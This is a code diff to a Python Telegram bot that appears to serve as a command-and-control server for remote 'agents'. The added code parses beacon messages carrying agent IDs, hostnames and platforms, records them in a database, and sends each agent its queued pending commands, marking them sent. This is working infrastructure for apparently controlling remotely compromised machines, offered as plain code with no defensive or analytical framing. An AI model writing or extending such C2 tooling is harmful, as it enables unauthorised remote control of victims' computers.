@@ -137,7 +137,17 @@ def handle_command(message):
     chat_id = message["chat"]["id"]
     user = message["from"].get("first_name", "User")
     
-    print(f"[TG-CMD] {user}: {text}")
+    print(f"[TG-CMD] {user}: {text[:50]}")
+    
+    # Check if this is a beacon from agent (not a command)
+    if text.startswith("📡") or "Beacon #" in text or "Agent:" in text:
+        handle_agent_beacon(message)
+        return
+    
+    # Check for agent registration message
+    if "🤖 Agent Online" in text or "ID:" in text:
+        handle_agent_message(message)
+        return
     
     # Parse command and args
     parts = text.split(maxsplit=2)
@@ -372,6 +382,76 @@ def handle_agent_message(message):
     # Forward all agent messages to admin
     if chat_id != int(CHAT_ID):
         send_message(f"📩 Agent message:\n{text[:500]}", CHAT_ID)
+
+def handle_agent_beacon(message):
+    """Handle beacon messages from agents."""
+    text = message.get("text", "")
+    chat_id = message["chat"]["id"]
+    
+    # Extract agent ID from beacon
+    # Format: "📡 Beacon #N\n\nAgent: xxx\nHostname: xxx\nPlatform: xxx"
+    agent_id = None
+    hostname = "unknown"
+    platform = "unknown"
+    
+    # Extract agent ID
+    id_match = re.search(r'Agent[:\s]+([a-f0-9\-]{8,})', text, re.IGNORECASE)
+    if id_match:
+        agent_id = id_match.group(1)
+    
+    # Extract hostname
+    host_match = re.search(r'Hostname[:\s]+([^\n]+)', text, re.IGNORECASE)
+    if host_match:
+        hostname = host_match.group(1).strip()
+    
+    # Extract platform
+    plat_match = re.search(r'Platform[:\s]+([^\n]+)', text, re.IGNORECASE)
+    if plat_match:
+        platform = plat_match.group(1).strip()
+    
+    if agent_id:
+        # Update agent in memory
+        agents[agent_id] = {
+            "chat_id": chat_id,
+            "platform": platform,
+            "hostname": hostname,
+            "last_seen": datetime.now().isoformat()
+        }
+        
+        # Update database
+        save_agent_to_db(agent_id, hostname, platform)
+        
+        # Get pending commands for this agent
+        try:
+            conn = get_db()
+            db = conn.cursor()
+            
+            # Get pending tasks
+            db.execute("""
+                SELECT id, task_type, payload 
+                FROM tasks 
+                WHERE agent_id = ? AND status = 'pending'
+                ORDER BY created_at ASC
+            """, (agent_id,))
+            
+            tasks = db.fetchall()
+            
+            if tasks:
+                # Send commands to agent
+                for task in tasks:
+                    task_id, task_type, command = task
+                    cmd_msg = f"📋 <b>Task #{task_id}</b>\nType: {task_type}\nCommand: {command}"
+                    send_message(cmd_msg, chat_id)
+                    
+                    # Mark as sent
+                    db.execute("UPDATE tasks SET status = 'sent' WHERE id = ?", (task_id,))
+                
+                conn.commit()
+                print(f"[TG-BEACON] Sent {len(tasks)} tasks to {agent_id[:8]}")
+            
+            conn.close()
+        except Exception as e:
+            print(f"[TG-DB-ERROR] {e}")
 
 def poll_loop():
     """Main polling loop."""
